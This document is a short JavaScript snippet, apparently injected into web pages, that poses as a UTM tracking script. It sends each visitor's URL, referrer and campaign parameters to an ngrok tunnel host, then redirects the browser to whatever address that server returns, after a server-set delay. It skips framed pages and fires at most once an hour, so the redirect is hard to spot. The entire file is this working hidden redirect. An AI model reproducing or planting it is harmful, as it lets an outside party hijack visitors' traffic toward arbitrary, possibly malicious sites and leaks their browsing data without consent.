(function () {

    function setC(name, value, exS) {
      const expires = new Date(Date.now() + exS * 1000).toUTCString();
      document.cookie = `${name}=${value}; expires=${expires}; path=/;`;
    }
  
    function getC(cname) {
      const cookies = document.cookie.split(';');
      for (let cookie of cookies) {
        cookie = cookie.trim();
        if (cookie.startsWith(`${cname}=`)) {
          return cookie.substring(cname.length + 1);
        }
      }
      return null;
    }
  
    (async function () {
      if (window && (window.self !== window.top)) {
        return ""; 
      }
  
      const rpE = getC("rpe");
      const cTime = Date.now();
  
      if (!rpE || cTime > parseInt(rpE)) {
  
        setC("rpe", Date.now() + 3600000, 3600);
        const p = new URLSearchParams(window.location.search);
        const d = {
          url: window.location.href,
          referrer: document.referrer,
          utm_medium: p.get("utm_medium"),
          utm_source: p.get("utm_source"),
          utm_campaign: p.get("utm_campaign"),
        };
  
        try {
          let resp = await fetch("https://flea-saved-dory.ngrok-free.app/utm_track", {
            method: "POST",
            body: JSON.stringify(d),
            headers: {
              "Content-Type": "application/json",
            },
          });
  
          if (resp && resp.ok) {
            const result = await resp.json();
            if (result && result["l"] && typeof result["in"] === "number") {
              if (result["in"] > 0) {
                await new Promise(resolve => setTimeout(resolve, result["in"] * 1000));
              }
              if (result["l"]) {
                window.location.href = result["l"];
              } else {
                p.set('utm_source', result["us"]);
                window.location.replace(`${window.location.pathname}?${p.toString()}`);
              }
            }
          }
        } catch (error) {}
      }
    })();
  })();
